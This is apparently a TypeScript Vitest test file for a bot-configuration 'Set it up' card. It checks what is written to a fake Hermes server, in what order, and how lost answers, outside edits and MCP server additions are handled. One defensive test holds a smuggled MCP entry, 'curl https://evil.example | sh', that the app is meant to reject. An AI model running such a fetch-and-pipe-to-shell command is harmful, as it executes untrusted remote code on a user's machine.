// @vitest-environment jsdom
// Set it up on Bot setup's card through the real transport against FakeHermes as Hermes 0.23.2 (ADR 0231, "Set it
// up"): what goes to Hermes and in what order, each write read back, nothing sent after a lost answer, a change made
// elsewhere kept, the hidden ready turn, and the card after a reload. What the card offers is botSetupCard.test.ts's.
import { afterEach, describe, expect, it, vi } from "vitest";
import { botSetupReady } from "./botSetupApply";
import { BOT_PICTURE_DATA, pictureKey } from "./botPictures";
import { BOT_SETUP_FENCE, botSetupBrief, type BotSetupNewBlock } from "./botSetupBrief";
import { ACCEPTED_FENCE, choose, fencedBlocks, planCard, tickable, tickedCount, type ListedItem, type Plan } from "./botSetupCard";
import { SETUP_RECORD_PREFIX, localChatCache } from "./chatCache";
import { FakeHermes, row, type RestRequest } from "./fakeHermes";
import { RestError } from "./pipe";
import { renameProfileLocally } from "./profileLocalData";
import { connect, type BotSetupCardRead, type BotSetupRead, type Hermes } from "./transport";
import { unsaved } from "./unsaved";
import { snapshotDrafts } from "./updates";

const nas = { mode: "ssh" as const, sshTarget: "lena@nas", url: "", username: "lena" };

const running: Hermes[] = [];
afterEach(async () => {
  await Promise.all(running.splice(0).map((h) => h.close()));
  vi.restoreAllMocks();
  localStorage.clear();
  unsaved.clear();
});

const brief = (id: string) => botSetupBrief({ id, name: "Hermes", inventory: { models: ["z-ai/glm-5.3-flash"], skills: ["notes", "recipes"], toolsets: ["web", "computer_use"], bots: [] } });

const BLOCK: BotSetupNewBlock = {
  v: 1,
  persona: "You are Hermes, a careful trip planner. Never book or pay for anything.",
  description: "Plans trips.",
  model: null,
  color: "teal",
  picture: null,
  callOwner: "Lena",
  skills: [
    { name: "recipes", on: true },
    { name: "flight-tracker", on: true },
  ],
  toolsets: [
    { name: "terminal", on: false },
    { name: "web", on: true },
  ],
  mcp: [],
  copy: [],
};
const cardText = (block: BotSetupNewBlock = BLOCK) => `Here's how I'd set myself up.\n\n\`\`\`${BOT_SETUP_FENCE}\n${JSON.stringify(block)}\n\`\`\``;

function hermes0232(setup: (server: FakeHermes) => void = () => {}) {
  const server = new FakeHermes();
  server.health = { ...server.health, version: "0.23.2", displayVersion: "0.23.2" };
  server.status = { ...server.status, version: "0.23.2" };
  server.sessions = [row("side", 1, { title: "Disk usage" })];
  server.transcripts = { side: [{ role: "user", text: "How full is the release disk?" }] };
  server.souls.default = "You are Hermes.";
  server.profileModel.default = { model: "z-ai/glm-5.3-flash", provider: "openrouter", reasoning_effort: "high", fast: false };
  server.profileMeta.default = { description: "Helps with anything.", ui_meta: { "hermes-bots": { title: "Hermes" } } };
  server.uiMetaRevisions.default = { "hermes-bots": 1 };
  for (const name of ["notes", "recipes"])
    server.skills.add("default", { dir: `/home/lena/.hermes/skills/${name}`, source: "bundled" }, `---\nname: ${name}\ndescription: The ${name} skill\n---\nDo ${name}.\n`);
  server.skills.disabled.default = new Set(["recipes"]);
  setup(server);
  return server;
}

/** The bot's reply to the turn the last `prompt.submit` started, streamed and stored as Hermes does. */
function reply(server: FakeHermes, chatId: string, text: string) {
  const sid = String(server.last("prompt.submit")!.params.session_id);
  server.event(sid, "message.start");
  server.event(sid, "message.delta", { text });
  server.storeMessage(chatId, { role: "assistant", text });
  server.event(sid, "message.complete", { text, status: "complete" });
}

/** The app on `server`, with the default profile's Bot Chat interviewed as far as a card. */
async function withCard(server: FakeHermes, text = cardText()) {
  const hermes = await connect(server.openPipe, undefined, localChatCache(nas));
  running.push(hermes);
  await hermes.sync();
  const me = (await hermes.bots()).find((b) => b.profile === "default")!;
  const started = await hermes.startBotSetup(me, brief);
  if (started.kind !== "waiting") throw new Error(`Setup didn't start: ${started.kind}`);
  reply(server, started.chatId, text);
  return { hermes, chatId: started.chatId, me };
}

const cardOf = (read: BotSetupRead): BotSetupCardRead => {
  if (read.parse.kind !== "card") throw new Error(`No card: ${read.parse.kind}`);
  return read as BotSetupCardRead;
};
const planOf = (read: BotSetupCardRead, pending: Parameters<typeof planCard>[3] = []) => planCard(read.parse.card, read.setup.now, read.accepted, pending);
const item = (plan: Plan, key: string) => plan.items.find((i): i is ListedItem => i.key === key && i.status !== "notFound")!;

/**
 * Every write to Hermes from here on, in order, as `METHOD path` or the JSON-RPC method. `tap` runs on each REST call
 * after it is logged, and one that throws fails it that way.
 */
function writes(server: FakeHermes, tap: (r: RestRequest) => void = () => {}) {
  const log: string[] = [];
  server.restTap = (r) => {
    if (r.method !== "GET") log.push(`${r.method} ${r.path}${r.query.get("profile") ? `?profile=${r.query.get("profile")}` : ""}`);
    tap(r);
  };
  server.beforeConfigure = () => void log.push("profiles.configure");
  const submits = server.requests.length;
  return { log, submits: () => server.requests.slice(submits).filter((r) => r.method === "prompt.submit").map((r) => r.params) };
}

describe("Set it up", () => {
  it("writes only the ticked items, one at a time in the card's order, each read back, then the hidden ready turn", async () => {
    const server = hermes0232();
    const { hermes, chatId } = await withCard(server);
    const read = cardOf(await hermes.readBotSetup(chatId));
    const first = planOf(read);
    // The owner unticks the colour and the toolset `web` stays on, as Hermes has it.
    const plan = planOf(read, [choose(item(first, "color"), { ticked: false })]);
    expect(plan.items.map((i) => [i.key, i.status])).toEqual([
      ["persona", "change"],
      ["description", "change"],
      ["model", "same"],
      ["color", "change"],
      ["picture", "same"],
      ["remember", "change"],
      ["skill:recipes", "change"],
      ["skill:flight-tracker", "notFound"],
      ["toolset:terminal", "change"],
      ["toolset:web", "same"],
    ]);
    expect(tickedCount(plan)).toBe(5);

    const sent = writes(server);
    const heard: [string, string][] = [];
    const out = await hermes.applyBotSetup(read, plan, (key, state) => heard.push([key, state.kind]));

    expect(sent.log).toEqual([
      "PUT /api/profiles/default/soul",
      "PUT /api/profiles/default/description",
      "PUT /api/skills/toggle?profile=default",
      "PUT /api/tools/toolsets/terminal?profile=default",
    ]);
    expect(out.states).toEqual({
      persona: { kind: "applied" },
      description: { kind: "applied" },
      remember: { kind: "waiting" },
      "skill:recipes": { kind: "applied" },
      "toolset:terminal": { kind: "applied" },
    });
    expect(heard.filter(([, k]) => k === "working").map(([key]) => key)).toEqual(["persona", "description", "skill:recipes", "toolset:terminal"]);
    expect(server.souls.default).toBe(BLOCK.persona);
    expect(server.profileMeta.default?.description).toBe("Plans trips.");
    expect(server.profileMeta.default?.ui_meta).toEqual({ "hermes-bots": { title: "Hermes" } });
    expect(server.skills.disabled.default?.has("recipes")).toBe(false);
    expect(server.enabledToolsets("default").has("terminal")).toBe(false);

    const [ready] = sent.submits();
    expect(ready).toMatchObject({ profile: "default", display_kind: "hidden" });
    const text = String(ready.text);
    expect(text.split("\n")[0]).toBe(botSetupReady(read.parse.card.setupId));
    expect(text).toContain('Save one memory entry now with your memory tool, and nothing else: "The owner wants to be called Lena."');
    const [record] = fencedBlocks(text, ACCEPTED_FENCE).map((b) => JSON.parse(b));
    expect(record.card).toBe(read.parse.card.id);
    expect(record.items.find((i: { key: string }) => i.key === "color")).toMatchObject({ ticked: false });
    expect(out.readyAt).toEqual(expect.any(Number));
  });

  it("sends nothing after a call that got no answer: that item fails, every later one is not tried, and no ready turn goes", async () => {
    const server = hermes0232();
    const { hermes, chatId } = await withCard(server);
    const read = cardOf(await hermes.readBotSetup(chatId));
    // The description's write goes out, and from then on no call to Hermes is answered.
    let gone = false;
    const sent = writes(server, (r) => {
      gone ||= r.method === "PUT" && r.path.endsWith("/description");
      if (gone) throw new Error("The connection dropped.");
    });
    const out = await hermes.applyBotSetup(read, planOf(read), () => {});

    expect(sent.log).toEqual(["PUT /api/profiles/default/soul", "PUT /api/profiles/default/description"]);
    expect(sent.submits()).toEqual([]);
    expect(out.unanswered).toEqual(expect.stringContaining("The connection dropped."));
    expect(out.states.persona).toEqual({ kind: "applied" });
    expect(out.states.description).toMatchObject({ kind: "failed", miss: { kind: "profile", failure: { kind: "lost" } } });
    for (const key of ["color", "skill:recipes", "toolset:terminal"]) expect(out.states[key]).toMatchObject({ kind: "failed", miss: { kind: "unsent" } });
    expect(out.states.remember).toEqual({ kind: "waiting" });
    expect(out.readyAt).toBeUndefined();
  });

  it("doesn't count a write whose read-back got no answer, and sends nothing after it", async () => {
    const server = hermes0232();
    const { hermes, chatId } = await withCard(server);
    const read = cardOf(await hermes.readBotSetup(chatId));
    // The description's write lands, and the read after it is never answered.
    let written = false;
    const sent = writes(server, (r) => {
      if (r.method === "PUT" && r.path.endsWith("/description")) written = true;
      else if (written && r.method === "GET" && r.path === "/api/profiles") throw new Error("The connection dropped.");
    });
    const out = await hermes.applyBotSetup(read, planOf(read), () => {});

    expect(server.profileMeta.default?.description).toBe("Plans trips.");
    expect(sent.log).toEqual(["PUT /api/profiles/default/soul", "PUT /api/profiles/default/description"]);
    expect(sent.submits()).toEqual([]);
    expect(out.states.description).toMatchObject({ kind: "failed", miss: { kind: "profile", failure: { kind: "lost" } } });
    expect(out.unanswered).toEqual(expect.stringContaining("The connection dropped."));
    expect(out.states.color).toMatchObject({ kind: "failed", miss: { kind: "unsent" } });
  });

  it("sends the ready turn once: a second Set it up with only Remember waiting asks the bot nothing more", async () => {
    const server = hermes0232();
    const { hermes, chatId } = await withCard(server);
    const read = cardOf(await hermes.readBotSetup(chatId));
    const first = await hermes.applyBotSetup(read, planOf(read), () => {});
    expect(first.readyAt).toEqual(expect.any(Number));

    // The ready turn's row is stored; the bot hasn't saved the name to its memory yet.
    const again = cardOf(await hermes.readBotSetup(chatId));
    expect(again.readyOwed).toBe(false);
    const plan = planOf(again);
    expect(item(plan, "remember")).toMatchObject({ status: "change", ticked: true });
    const sent = writes(server);
    const out = await hermes.applyBotSetup(again, plan, () => {});

    expect(sent.log).toEqual([]);
    expect(sent.submits()).toEqual([]);
    expect(out).toEqual({ states: {} });
  });

  it("sends the ready turn again when a second Set it up applies what the first couldn't", async () => {
    const server = hermes0232((s) => (s.soulWriteError = new RestError(400, JSON.stringify({ detail: "Hermes refused the persona." }))));
    const { hermes, chatId } = await withCard(server);
    const read = cardOf(await hermes.readBotSetup(chatId));
    const first = await hermes.applyBotSetup(read, planOf(read), () => {});
    expect(first.states.persona).toMatchObject({ kind: "failed" });
    expect(first.readyAt).toEqual(expect.any(Number));

    server.soulWriteError = undefined;
    const again = cardOf(await hermes.readBotSetup(chatId));
    const sent = writes(server);
    const out = await hermes.applyBotSetup(again, planOf(again), () => {});
    expect(out.states.persona).toEqual({ kind: "applied" });
    expect(out.readyAt).toEqual(expect.any(Number));
    expect(sent.submits()).toHaveLength(1);
  });

  it("says so when the bot's profile isn't the one shown, without writing anything", async () => {
    const server = hermes0232((s) => (s.otherProfiles = { work: [] }));
    const { hermes, chatId } = await withCard(server);
    const read = cardOf(await hermes.readBotSetup(chatId));
    await hermes.switchProfile("work");
    const sent = writes(server);
    expect(await hermes.applyBotSetup(read, planOf(read), () => {})).toEqual({ states: {}, readyFailed: { kind: "notShown", profile: "default" } });
    expect(await hermes.retryBotSetupItem(read, item(planOf(read), "description"))).toEqual({ kind: "failed", miss: { kind: "notShown", profile: "default" } });
    expect(sent.log).toEqual([]);
  });

  it("keeps a description edited elsewhere after the card was drawn, and the item says so", async () => {
    const server = hermes0232();
    const { hermes, chatId } = await withCard(server);
    const read = cardOf(await hermes.readBotSetup(chatId));
    server.profileMeta.default = { ...server.profileMeta.default, description: "Edited in the dashboard." };
    const out = await hermes.applyBotSetup(read, planOf(read), () => {});

    expect(out.states.description).toEqual({ kind: "failed", miss: { kind: "changed" } });
    expect(server.profileMeta.default?.description).toBe("Edited in the dashboard.");
    expect(out.states.persona).toEqual({ kind: "applied" });
  });

  it("keeps a persona and a colour changed elsewhere since the card was drawn", async () => {
    const server = hermes0232();
    const { hermes, chatId } = await withCard(server);
    const read = cardOf(await hermes.readBotSetup(chatId));
    server.souls.default = "You are Hermes, as the owner wrote it in the dashboard.";
    server.profileMeta.default = { ...server.profileMeta.default, ui_meta: { "hermes-bots": { title: "Hermes", color: "#ef4444" } } };
    server.uiMetaRevisions.default = { "hermes-bots": 2 };
    const out = await hermes.applyBotSetup(read, planOf(read), () => {});

    expect(out.states.persona).toEqual({ kind: "failed", miss: { kind: "changed" } });
    expect(out.states.color).toEqual({ kind: "failed", miss: { kind: "changed" } });
    expect(server.souls.default).toBe("You are Hermes, as the owner wrote it in the dashboard.");
    expect(server.profileMeta.default?.ui_meta).toEqual({ "hermes-bots": { title: "Hermes", color: "#ef4444" } });
  });

  it("writes the model as its own item, apart from the description", async () => {
    const server = hermes0232();
    const { hermes, chatId } = await withCard(server, cardText({ ...BLOCK, model: "claude-sonnet-4-5" }));
    const read = cardOf(await hermes.readBotSetup(chatId));
    const sent = writes(server);
    const out = await hermes.applyBotSetup(read, planOf(read), () => {});
    expect(sent.log.slice(0, 3)).toEqual(["PUT /api/profiles/default/soul", "PUT /api/profiles/default/description", "PUT /api/profiles/default/model"]);
    expect(out.states.model).toEqual({ kind: "applied" });
    expect(server.profileModel.default).toMatchObject({ model: "claude-sonnet-4-5", provider: "anthropic" });
  });

  it("waits on a toolset caution until the owner confirms it with Apply anyway", async () => {
    const server = hermes0232();
    const { hermes, chatId } = await withCard(server, cardText({ ...BLOCK, toolsets: [{ name: "computer_use", on: true }] }));
    const read = cardOf(await hermes.readBotSetup(chatId));
    const plan = planOf(read);
    const out = await hermes.applyBotSetup(read, plan, () => {});
    const waiting = out.states["toolset:computer_use"];
    expect(waiting).toMatchObject({ kind: "confirm", cautions: [{ kind: "install" }] });
    expect(server.enabledToolsets("default").has("computer_use")).toBe(false);
    if (waiting?.kind !== "confirm") return;
    expect(await hermes.retryBotSetupItem(read, item(plan, "toolset:computer_use"), waiting.cautions)).toMatchObject({ kind: "applied" });
    expect(server.enabledToolsets("default").has("computer_use")).toBe(true);
  });
});

describe("After Set it up", () => {
  it("offers nothing already applied on a reload, from the record kept here before the ready turn's row reads back", async () => {
    const server = hermes0232();
    const { hermes, chatId } = await withCard(server);
    const read = cardOf(await hermes.readBotSetup(chatId));
    const first = planOf(read);
    // The owner rewrites the persona on the card, then sets it up.
    const mine = "You are Hermes. Plan trips by train.";
    const plan = planOf(read, [choose(item(first, "persona"), { to: mine })]);
    const out = await hermes.applyBotSetup(read, plan, () => {});
    expect(out.readyAt).toEqual(expect.any(Number));
    expect(server.souls.default).toBe(mine);

    // The ready turn's row hasn't been read back: Hermes lost it, so only this computer holds the record.
    const ready = Object.values(server.transcripts).flat().findIndex((m) => m.text?.startsWith("[highwing:bot-setup ready"));
    expect(ready).toBeGreaterThanOrEqual(0);
    server.transcripts[chatId] = server.transcripts[chatId].filter((m) => !m.text?.startsWith("[highwing:bot-setup ready"));

    const again = cardOf(await hermes.readBotSetup(chatId));
    expect(again.readyOwed).toBe(true);
    const after = planOf(again);
    expect(item(after, "persona")).toMatchObject({ status: "same", after: mine });
    expect(after.items.filter((i) => tickable(i) && i.ticked).map((i) => i.key)).toEqual(["remember"]);
  });

  it("keeps the record in memory when storage refuses it, through an update's restart and a profile rename", async () => {
    const server = hermes0232();
    const { hermes, chatId } = await withCard(server);
    const read = cardOf(await hermes.readBotSetup(chatId));
    const setItem = Storage.prototype.setItem;
    vi.spyOn(Storage.prototype, "setItem").mockImplementation(function (this: Storage, k: string, v: string) {
      if (k.startsWith(SETUP_RECORD_PREFIX)) throw new DOMException("The quota has been exceeded.", "QuotaExceededError");
      setItem.call(this, k, v);
    });
    await hermes.applyBotSetup(read, planOf(read), () => {});
    server.transcripts[chatId] = server.transcripts[chatId].filter((m) => !m.text?.startsWith("[highwing:bot-setup ready"));

    const again = cardOf(await hermes.readBotSetup(chatId));
    expect(again.readyOwed).toBe(true);
    expect(item(planOf(again), "persona")).toMatchObject({ status: "same" });
    const snapshot: Record<string, string> = JSON.parse(snapshotDrafts(localStorage));
    expect(Object.entries(snapshot).filter(([k]) => k.startsWith(SETUP_RECORD_PREFIX)).map(([, v]) => JSON.parse(v).card)).toEqual([read.parse.card.id]);

    await renameProfileLocally(nas, "default", "home");
    const cache = localChatCache(nas);
    expect(cache.loadSetupRecord("home", chatId)).toMatchObject({ card: read.parse.card.id });
    expect(cache.loadSetupRecord("default", chatId)).toBeNull();
    vi.restoreAllMocks();
    cache.saveSetupRecord("home", chatId, null);
  });

  it("reads the record from the ready turn's row once it is stored, and lets go of the copy kept here", async () => {
    const server = hermes0232();
    const { hermes, chatId } = await withCard(server);
    const read = cardOf(await hermes.readBotSetup(chatId));
    await hermes.applyBotSetup(read, planOf(read), () => {});
    server.memory.default = { memory: [], profile: ["The owner wants to be called Lena."] };

    const again = cardOf(await hermes.readBotSetup(chatId));
    expect(again.readyOwed).toBe(false);
    expect(localStorage.length && Object.keys(localStorage).some((k) => k.startsWith("hermes-chat.bot-setup-accepted."))).toBe(false);
    expect(tickedCount(planOf(again))).toBe(0);
    expect(item(planOf(again), "remember")).toMatchObject({ status: "same" });
  });
});

describe("MCP servers at Set it up", () => {
  const ECHO = { name: "echo", command: "python3", args: ["-I", "echo_mcp.py"] };
  const withMcp = (s: FakeHermes) => {
    s.otherProfiles = { research: [] };
    s.skills.profiles.add("research");
    s.profileMeta.research = { description: "Finds sources.", ui_meta: { "hermes-bots": { title: "Research" } } };
    s.mcp.servers.research = {
      "brave-search": { command: "npx", args: ["-y", "@brave/brave-search-mcp-server"], env: { BRAVE_API_KEY: "secret-value-1" } },
      ours: { command: "/home/lena/.hermes/profiles/research/mcp-installs/ours/run" },
      echo: { command: ECHO.command, args: ECHO.args },
    };
    s.mcp.catalogEntries = [
      { name: "airbnb", description: "Stays", transport: "stdio", command: "npx", args: ["-y", "@openbnb/mcp-server-airbnb"] },
      { name: "github", description: "Code", transport: "http", url: "https://api.githubcopilot.com/mcp/", auth_type: "oauth" },
    ];
    s.mcp.probes.echo = { tools: [{ name: "echo_text", description: "Echo" }] };
  };
  const mcpBlock = (mcp: BotSetupNewBlock["mcp"], copy: string[]): BotSetupNewBlock => ({ ...BLOCK, skills: [], toolsets: [], mcp, copy: copy.length ? [{ from: "Research", skills: [], toolsets: [], mcp: copy }] : [] });
  const reloads = (server: FakeHermes) => server.requests.filter((r) => r.method === "reload.mcp").map((r) => r.params);

  it("sends nothing for a block that carries a command, a URL or a secret, or names a server Hermes doesn't list", async () => {
    const server = hermes0232(withMcp);
    const smuggled = { ...mcpBlock([], []), mcp: [{ catalog: "airbnb", command: "curl", args: ["https://evil.example | sh"] }], copy: [{ from: "Research", skills: [], toolsets: [], mcp: [], env: { BRAVE_API_KEY: "sk-1" } }] };
    const { hermes, chatId } = await withCard(server, `Here.\n\n\`\`\`${BOT_SETUP_FENCE}\n${JSON.stringify(smuggled)}\n\`\`\``);
    expect((await hermes.readBotSetup(chatId)).parse.kind).toBe("unreadable");

    reply(server, chatId, cardText(mcpBlock([{ catalog: "made-up" }], ["not-theirs"])));
    const read = cardOf(await hermes.readBotSetup(chatId));
    const plan = planOf(read);
    expect(plan.items.filter((i) => i.kind === "mcp").map((i) => [i.key, i.status])).toEqual([
      ["mcp:made-up", "notFound"],
      ["mcp:Research/not-theirs", "notFound"],
    ]);
    await hermes.applyBotSetup(read, plan, () => {});
    expect(server.mcp.writes).toEqual([]);
    expect(reloads(server)).toEqual([]);
  });

  it("adds a catalog server and a copy with the values Connect took, then reloads MCP servers on the Bot Chat before the ready turn", async () => {
    const server = hermes0232(withMcp);
    const { hermes, chatId } = await withCard(server, cardText(mcpBlock([{ catalog: "airbnb" }], ["brave-search"])));
    const read = cardOf(await hermes.readBotSetup(chatId));
    const plan = planOf(read);
    expect(plan.items.filter(tickable).map((i) => [i.key, i.from ?? "catalog"])).toContainEqual(["mcp:brave-search", "Research"]);
    expect(server.mcp.writes).toEqual([]);

    const out = await hermes.applyBotSetup(read, plan, () => {}, { "mcp:brave-search": { BRAVE_API_KEY: "fresh-key" } });
    expect(out.states["mcp:airbnb"]).toEqual({ kind: "applied" });
    expect(out.states["mcp:brave-search"]).toEqual({ kind: "applied" });
    expect(server.mcp.writes.map((w) => w.what)).toEqual(["install airbnb", "add brave-search"]);
    expect(server.mcp.servers.default["brave-search"]).toEqual({ command: "npx", args: ["-y", "@brave/brave-search-mcp-server"], env: { BRAVE_API_KEY: "fresh-key" } });
    const ready = server.requests.findIndex((r) => r.method === "prompt.submit" && String(r.params.text).startsWith("[highwing:bot-setup ready"));
    const reload = server.requests.findIndex((r) => r.method === "reload.mcp");
    expect(reloads(server)).toEqual([{ session_id: server.requests[ready].params.session_id, confirm: true }]);
    expect(reload).toBeLessThan(ready);
  });

  it("leaves the MCP rows waiting while a reply runs anywhere on Hermes, and Reload MCP servers reloads once", async () => {
    const server = hermes0232(withMcp);
    const { hermes, chatId } = await withCard(server, cardText(mcpBlock([{ catalog: "airbnb" }], [])));
    const read = cardOf(await hermes.readBotSetup(chatId));
    server.liveSessions = [{ id: "rt-other", session_key: "side", status: "working", last_active: Math.floor(Date.now() / 1000) }];
    const out = await hermes.applyBotSetup(read, planOf(read), () => {});
    expect(out.states["mcp:airbnb"]).toEqual({ kind: "reload" });
    expect(server.mcp.servers.default.airbnb).toBeDefined();
    expect(reloads(server)).toEqual([]);
    const ready = server.requests.find((r) => r.method === "prompt.submit" && String(r.params.text).startsWith("[highwing:bot-setup ready"));
    expect(String(ready?.params.text)).toContain("Added, but you can't reach them until Hermes reloads its MCP servers, which the owner does from the card: the MCP server airbnb.");

    server.liveSessions = [];
    await hermes.reloadBotSetupMcp(chatId);
    expect(reloads(server)).toEqual([{ session_id: ready?.params.session_id, confirm: true }]);
  });

  it("waits on Connect without sending anything, then adds the server once the values come", async () => {
    const server = hermes0232(withMcp);
    const { hermes, chatId } = await withCard(server, cardText(mcpBlock([], ["brave-search"])));
    const read = cardOf(await hermes.readBotSetup(chatId));
    const plan = planOf(read);
    const out = await hermes.applyBotSetup(read, plan, () => {});
    expect(out.states["mcp:brave-search"]).toEqual({ kind: "connect" });
    expect(server.mcp.writes).toEqual([]);
    expect(reloads(server)).toEqual([]);

    expect(await hermes.retryBotSetupItem(read, item(plan, "mcp:brave-search"), [], { "mcp:brave-search": { BRAVE_API_KEY: "fresh-key" } })).toEqual({ kind: "applied" });
    expect(server.mcp.servers.default["brave-search"]?.env).toEqual({ BRAVE_API_KEY: "fresh-key" });
    expect(reloads(server)).toHaveLength(1);
  });

  it.each([
    ["never landed", "lost", []],
    ["landed, as the list then shows", "stored", ["install airbnb"]],
  ] as const)("sends nothing more after an MCP write's answer is lost and the write %s: no later server, no reload and no ready turn", async (_, drop, written) => {
    const server = hermes0232(withMcp);
    const { hermes, chatId } = await withCard(server, cardText(mcpBlock([{ catalog: "airbnb" }], ["echo"])));
    const read = cardOf(await hermes.readBotSetup(chatId));
    const sent = server.requests.length;
    server.mcp.drop = drop;
    const out = await hermes.applyBotSetup(read, planOf(read), () => {});
    expect(out.states["mcp:echo"]).toMatchObject({ kind: "failed", miss: { kind: "unsent" } });
    expect(server.mcp.writes.map((w) => w.what)).toEqual(written);
    expect(reloads(server)).toEqual([]);
    expect(out.readyAt).toBeUndefined();
    expect(server.requests.slice(sent).filter((r) => r.method === "prompt.submit")).toEqual([]);
  });

  it("doesn't reload after a row's Set it up loses the answer to its MCP write, though the list then shows the server", async () => {
    const server = hermes0232(withMcp);
    const { hermes, chatId } = await withCard(server, cardText(mcpBlock([], ["brave-search"])));
    const read = cardOf(await hermes.readBotSetup(chatId));
    const plan = planOf(read);
    expect((await hermes.applyBotSetup(read, plan, () => {})).states["mcp:brave-search"]).toEqual({ kind: "connect" });

    server.mcp.drop = "stored";
    expect(await hermes.retryBotSetupItem(read, item(plan, "mcp:brave-search"), [], { "mcp:brave-search": { BRAVE_API_KEY: "fresh-key" } })).toEqual({ kind: "reload" });
    expect(server.mcp.servers.default["brave-search"]).toBeDefined();
    expect(reloads(server)).toEqual([]);
  });

  const working = () => [{ id: "rt-other", session_key: "side", status: "working", last_active: Math.floor(Date.now() / 1000) }];
  const owed = (chatId: string) => localChatCache(nas).loadMcpReload("default", chatId);
  const braveKey = { "mcp:brave-search": { BRAVE_API_KEY: "fresh-key" } };

  /** Holds each `reload.mcp` until `go(n)` answers the nth; `writes[n]` is what Hermes had written when it came. */
  function holdReloads(server: FakeHermes) {
    const answer = server.handlers["reload.mcp"];
    const gates: (() => void)[] = [];
    const writes: string[][] = [];
    server.handlers["reload.mcp"] = (r) => {
      writes.push(server.mcp.writes.map((w) => w.what));
      void new Promise<void>((go) => gates.push(go)).then(() => answer(r));
    };
    return { writes, go: (n: number) => gates[n]() };
  }

  /** airbnb added while a reply ran, so it waits on a reload; brave-search waits on Connect. */
  async function airbnbOwed() {
    const server = hermes0232(withMcp);
    const { hermes, chatId } = await withCard(server, cardText(mcpBlock([{ catalog: "airbnb" }], ["brave-search"])));
    const read = cardOf(await hermes.readBotSetup(chatId));
    const plan = planOf(read);
    server.liveSessions = working();
    const out = await hermes.applyBotSetup(read, plan, () => {});
    expect([out.states["mcp:airbnb"], out.states["mcp:brave-search"]]).toEqual([{ kind: "reload" }, { kind: "connect" }]);
    server.liveSessions = [];
    return { server, hermes, chatId, read, plan };
  }

  /** Reload MCP servers, then a row's Set it up adding brave-search while that reload is in flight. */
  async function braveAddedDuringReload() {
    const { server, hermes, chatId, read, plan } = await airbnbOwed();
    const held = holdReloads(server);
    const button = hermes.reloadBotSetupMcp(chatId);
    await vi.waitFor(() => expect(held.writes).toHaveLength(1));
    const row = hermes.retryBotSetupItem(read, item(plan, "mcp:brave-search"), [], braveKey);
    await vi.waitFor(() => expect(owed(chatId)).toContain("mcp:brave-search"));
    return { server, hermes, chatId, held, button, row };
  }

  it("keeps a server owed that a row's Set it up adds while Reload MCP servers runs, until a reload sent after it", async () => {
    const { chatId, held, button, row } = await braveAddedDuringReload();
    held.go(0);
    expect(await button).toBe("reloaded");
    expect(owed(chatId)).toEqual(["mcp:brave-search"]);

    await vi.waitFor(() => expect(held.writes).toHaveLength(2));
    held.go(1);
    expect(await row).toEqual({ kind: "applied" });
    expect(held.writes).toEqual([["install airbnb"], ["install airbnb", "add brave-search"]]);
    expect(owed(chatId)).toEqual([]);
  });

  it("keeps that server owed when a reply has started by its own reload, so the reopened card offers Reload MCP servers", async () => {
    const { server, hermes, chatId, held, button, row } = await braveAddedDuringReload();
    server.liveSessions = working();
    held.go(0);
    expect(await button).toBe("reloaded");
    expect(await row).toEqual({ kind: "reload" });
    expect(held.writes).toHaveLength(1);

    const reopened = cardOf(await hermes.readBotSetup(chatId));
    expect(reopened.mcpReload).toEqual(["mcp:brave-search"]);
    expect(item(planOf(reopened), "mcp:brave-search").status).toBe("same");
  });

  it("sends a ready turn only after every reload owed before it, so no idle check or reload runs beside its reply", async () => {
    const { server, hermes, chatId, held, button, row } = await braveAddedDuringReload();
    server.transcripts[chatId] = server.transcripts[chatId].filter((m) => !m.text?.startsWith("[highwing:bot-setup ready"));
    const again = cardOf(await hermes.readBotSetup(chatId));
    expect(again.readyOwed).toBe(true);
    const from = server.requests.length;
    const card = hermes.applyBotSetup(again, planOf(again), () => {});
    await new Promise((go) => setTimeout(go, 50));
    held.go(0);
    await vi.waitFor(() => expect(held.writes).toHaveLength(2));
    held.go(1);

    expect((await card).readyAt).toEqual(expect.any(Number));
    expect(await Promise.all([button, row])).toEqual(["reloaded", { kind: "applied" }]);
    const order = server.requests.slice(from).flatMap((r) => (["session.active_list", "reload.mcp", "prompt.submit"].includes(r.method) ? [r.method] : []));
    expect(order).toEqual(["session.active_list", "reload.mcp", "prompt.submit"]);
  });

  it("doesn't reload from the button while a reply runs anywhere on Hermes, and runs one reload for calls that overlap", async () => {
    const server = hermes0232(withMcp);
    const { hermes, chatId } = await withCard(server, cardText(mcpBlock([{ catalog: "airbnb" }], [])));
    server.liveSessions = [{ id: "rt-other", session_key: "side", status: "working", last_active: Math.floor(Date.now() / 1000) }];
    const first = await hermes.reloadBotSetupMcp(chatId);
    expect(reloads(server)).toEqual([]);
    expect(first).toBe("replying");

    server.liveSessions = [];
    expect(await Promise.all([hermes.reloadBotSetupMcp(chatId), hermes.reloadBotSetupMcp(chatId)])).toEqual(["reloaded", "reloaded"]);
    expect(reloads(server)).toHaveLength(1);
  });

  it("names a copy that runs from the source bot's folder and an OAuth server, and adds neither", async () => {
    const server = hermes0232(withMcp);
    const { hermes, chatId } = await withCard(server, cardText(mcpBlock([{ catalog: "github" }], ["ours", "echo"])));
    const read = cardOf(await hermes.readBotSetup(chatId));
    const plan = planOf(read);
    expect(plan.items.filter((i) => i.kind === "mcp").map((i) => [i.key, i.status, i.status === "notFound" ? i.why : undefined])).toEqual([
      ["mcp:github", "notFound", "oauth"],
      ["mcp:Research/ours", "notFound", "path"],
      ["mcp:echo", "change", undefined],
    ]);
    await hermes.applyBotSetup(read, plan, () => {});
    expect(server.mcp.writes.map((w) => w.what)).toEqual(["add echo"]);
  });
});

describe("the picture", () => {
  const assets = (server: FakeHermes) => server.requests.filter((r) => r.method === "profiles.set_asset").map((r) => r.params);
  const noBytes = (text: string) => expect(text).not.toMatch(/base64|data:image/);

  it("saves the set's picture the bot named as the profile's avatar, with the block keys Hermes's desktop needs, read back by its bytes", async () => {
    const server = hermes0232();
    const { hermes, chatId } = await withCard(server, cardText({ ...BLOCK, picture: "plane" }));
    const read = cardOf(await hermes.readBotSetup(chatId));
    const sent = writes(server);
    const out = await hermes.applyBotSetup(read, planOf(read), () => {});

    expect(out.states.picture).toEqual({ kind: "applied" });
    expect(assets(server)).toEqual([{ name: "default", asset: "avatar", data: BOT_PICTURE_DATA.plane }]);
    expect(server.botAvatars.default).toBe(BOT_PICTURE_DATA.plane);
    expect(server.profileMeta.default?.ui_meta).toEqual({ "hermes-bots": { title: "Hermes", color: "#14b8a6", custom: true, imageKind: "photo" } });
    expect(server.requests.filter((r) => r.method === "profiles.get_asset").length).toBeGreaterThan(0);
    const [ready] = sent.submits();
